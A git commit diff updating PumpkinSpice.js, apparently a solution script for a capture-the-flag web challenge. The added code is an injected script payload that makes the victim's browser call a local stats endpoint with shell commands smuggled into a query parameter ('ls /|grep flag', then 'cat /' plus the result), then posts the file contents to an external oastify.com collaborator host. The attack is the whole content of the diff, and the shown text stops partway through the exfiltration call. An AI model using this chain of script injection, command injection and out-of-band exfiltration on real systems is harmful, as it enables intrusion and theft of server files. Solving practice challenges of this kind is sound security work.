393e897598b7c5178cd60625004417d9f918da45
jellyf15h <86880362+jellyf15h@users.noreply.github.com>
2024-05-15 16:58:13 -0700

    Update PumpkinSpice.js

--- PumpkinSpice.js
+++ PumpkinSpice.js
@@ -1,9 +1,8 @@
 <script>
-fetch("http://127.0.0.1:1337/api/stats")
-  .then((response) => response.json())
-  .then((data) => {
-    const filename = data.filename; // Assuming the response contains the filename
-    fetch(`http://127.0.0.1:1337/api/stats?filename=${filename}`)
+fetch("http://127.0.0.1:1337/api/stats?command=ls+/|grep+flag")
+  .then((response) => response.text())
+  .then((data) => { 
+    fetch(`http://127.0.0.1:1337/api/stats?command=cat+/`+data)
       .then((response) => response.text())
       .then((fileContent) => {
         fetch('http://xklqf2ly81rowgujq4vgur2vcmid66uv.oastify.com', {
